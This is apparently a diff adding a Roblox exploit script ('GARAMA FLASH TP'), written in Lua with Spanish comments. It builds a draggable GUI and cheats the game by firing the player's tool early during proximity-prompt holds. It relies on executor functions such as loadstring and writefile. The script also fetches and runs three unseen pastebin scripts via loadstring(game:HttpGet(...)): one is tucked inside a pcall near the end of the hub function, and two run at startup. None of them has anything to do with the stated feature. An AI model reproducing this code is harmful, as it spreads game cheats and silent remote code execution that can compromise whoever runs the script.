@@ -1,0 +1,209 @@
+-- // SERVICIOS
+local UIS = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+-- // ARCHIVOS DE GUARDADO
+local ArchivoConfig = "GaramaFlashTP_Config.json"
+
+-- // PERSISTENCIA DE AJUSTES
+local function GuardarAjustes(valorPerc, isMini, pos)
+    local data = {
+        porcentaje = valorPerc or 50,
+        minimo = isMini,
+        posX = pos and pos.X.Scale or 0.5,
+        posOffset = pos and pos.X.Offset or -125,
+        posY = pos and pos.Y.Scale or 0.4,
+        posYOffset = pos and pos.Y.Offset or 0
+    }
+    pcall(function() writefile(ArchivoConfig, HttpService:JSONEncode(data)) end)
+end
+
+local function CargarAjustes()
+    if isfile(ArchivoConfig) then
+        local s, r = pcall(function() return HttpService:JSONDecode(readfile(ArchivoConfig)) end)
+        if s and r then return r end
+    end
+    return {porcentaje = 50, minimo = false, posX = 0.5, posOffset = -125, posY = 0.4, posYOffset = 0}
+end
+
+local config = CargarAjustes()
+local sliderValue = config.porcentaje / 100
+local flashEnabled = true
+local draggingSlider = false
+local hubMinimized = config.minimo
+
+-- // INTERFAZ PRINCIPAL (HUB)
+local function IniciarHub()
+    local ScreenGui = Instance.new("ScreenGui", CoreGui)
+    ScreenGui.Name = "GaramaFlashTP_HUB"
+
+    local Main = Instance.new("Frame", ScreenGui)
+    Main.Size = hubMinimized and UDim2.new(0, 260, 0, 30) or UDim2.new(0, 260, 0, 140)
+    Main.Position = UDim2.new(config.posX, config.posOffset, config.posY, config.posYOffset)
+    Main.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+    Main.BackgroundTransparency = 0.3
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)
+    Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 0, 0)
+
+    -- TOP BAR
+    local Top = Instance.new("Frame", Main)
+    Top.Size = UDim2.new(1, 0, 0, 30)
+    Top.BackgroundTransparency = 1
+
+    local Title = Instance.new("TextLabel", Top)
+    Title.Size = UDim2.new(0, 120, 1, 0)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.Text = "GARAMA FLASH TP"
+    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 12
+    Title.BackgroundTransparency = 1
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+
+    local Discord = Instance.new("TextLabel", Top)
+    Discord.Size = UDim2.new(0, 100, 1, 0)
+    Discord.Position = UDim2.new(0, 125, 0, 0)
+    Discord.Text = "discord.gg/bAmUMbY4K"
+    Discord.TextColor3 = Color3.new(1, 1, 1)
+    Discord.Font = Enum.Font.Gotham
+    Discord.TextSize = 8
+    Discord.BackgroundTransparency = 1
+    Discord.TextXAlignment = Enum.TextXAlignment.Left
+
+    local MinBtn = Instance.new("TextButton", Top)
+    MinBtn.Size = UDim2.new(0, 22, 0, 22)
+    MinBtn.Position = UDim2.new(1, -28, 0.5, -11)
+    MinBtn.Text = hubMinimized and "+" or "—"
+    MinBtn.TextColor3 = Color3.new(1, 1, 1)
+    MinBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    MinBtn.Font = Enum.Font.GothamBold
+    MinBtn.TextSize = 12
+    Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 4)
+
+    -- CONTENIDO
+    local Content = Instance.new("Frame", Main)
+    Content.Size = UDim2.new(1, 0, 1, -30)
+    Content.Position = UDim2.new(0, 0, 0, 30)
+    Content.BackgroundTransparency = 1
+    Content.Visible = not hubMinimized
+
+    local ToggleBtn = Instance.new("TextButton", Content)
+    ToggleBtn.Size = UDim2.new(0.9, 0, 0, 35)
+    ToggleBtn.Position = UDim2.new(0.05, 0, 0.15, 0)
+    ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    ToggleBtn.Text = "FLASH: ON"
+    ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
+    ToggleBtn.Font = Enum.Font.GothamBold
+    ToggleBtn.TextSize = 12
+    Instance.new("UICorner", ToggleBtn)
+
+    local Slider = Instance.new("Frame", Content)
+    Slider.Size = UDim2.new(0.72, 0, 0, 5)
+    Slider.Position = UDim2.new(0.05, 0, 0.75, 0)
+    Slider.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    Instance.new("UICorner", Slider)
+
+    local Fill = Instance.new("Frame", Slider)
+    Fill.Size = UDim2.new(sliderValue, 0, 1, 0)
+    Fill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Instance.new("UICorner", Fill)
+
+    local Handle = Instance.new("Frame", Slider)
+    Handle.Size = UDim2.new(0, 12, 0, 12)
+    Handle.AnchorPoint = Vector2.new(0.5, 0.5)
+    Handle.Position = UDim2.new(sliderValue, 0, 0.5, 0)
+    Handle.BackgroundColor3 = Color3.new(1, 1, 1)
+    Instance.new("UICorner", Handle)
+
+    local Percent = Instance.new("TextLabel", Content)
+    Percent.Size = UDim2.new(0, 40, 0, 20)
+    Percent.Position = UDim2.new(0.82, 0, 0.68, 0)
+    Percent.BackgroundTransparency = 1
+    Percent.Text = math.floor(sliderValue * 100) .. "%"
+    Percent.TextColor3 = Color3.new(1, 1, 1)
+    Percent.Font = Enum.Font.GothamBold
+    Percent.TextSize = 11
+
+    -- // EVENTOS HUB
+    MinBtn.MouseButton1Click:Connect(function()
+        hubMinimized = not hubMinimized
+        Content.Visible = not hubMinimized
+        MinBtn.Text = hubMinimized and "+" or "—"
+        Main:TweenSize(hubMinimized and UDim2.new(0, 260, 0, 30) or UDim2.new(0, 260, 0, 140), "Out", "Quad", 0.2, true)
+        GuardarAjustes(math.floor(sliderValue * 100), hubMinimized, Main.Position)
+    end)
+
+    Main:GetPropertyChangedSignal("Position"):Connect(function()
+        if not draggingSlider then GuardarAjustes(math.floor(sliderValue * 100), hubMinimized, Main.Position) end
+    end)
+
+    local function updateSlider(x)
+        local size = math.clamp((x - Slider.AbsolutePosition.X) / Slider.AbsoluteSize.X, 0, 1)
+        sliderValue = size
+        Fill.Size = UDim2.new(size, 0, 1, 0)
+        Handle.Position = UDim2.new(size, 0, 0.5, 0)
+        Percent.Text = math.floor(size * 100) .. "%"
+        GuardarAjustes(math.floor(size * 100), hubMinimized, Main.Position)
+    end
+
+    Slider.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            draggingSlider = true
+            Main.Draggable = false
+            updateSlider(i.Position.X)
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(i)
+        if draggingSlider and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            updateSlider(i.Position.X)
+        end
+    end)
+
+    UIS.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            draggingSlider = false
+            Main.Draggable = true
+        end
+    end)
+
+    ToggleBtn.MouseButton1Click:Connect(function()
+        flashEnabled = not flashEnabled
+        ToggleBtn.Text = flashEnabled and "FLASH: ON" or "FLASH: OFF"
+        ToggleBtn.TextColor3 = flashEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 50, 50)
+    end)
+
+    -- // LÓGICA TRIGGER FLASH
+    ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+        if not flashEnabled then return end
+        local start = os.clock()
+        local conn
+        conn = RunService.RenderStepped:Connect(function()
+            if not prompt or not prompt.Parent then conn:Disconnect() return end
+            if (os.clock() - start) / prompt.HoldDuration >= sliderValue then
+                conn:Disconnect()
+                local tool = player.Character:FindFirstChildOfClass("Tool")
+                if tool then tool:Activate() end
+            end
+        end)
+        prompt.PromptButtonHoldEnded:Connect(function() if conn then conn:Disconnect() end end)
+    end)
+
+    -- // EJECUTAR LOADSTRING ADICIONAL
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Ub7EPznU"))()
+    end)
+end
+
+-- INICIO DEL SCRIPT DIRECTO
+IniciarHub()
+loadstring(game:HttpGet("https://pastebin.com/raw/9yVVReYs"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/uTiSfdDK"))()
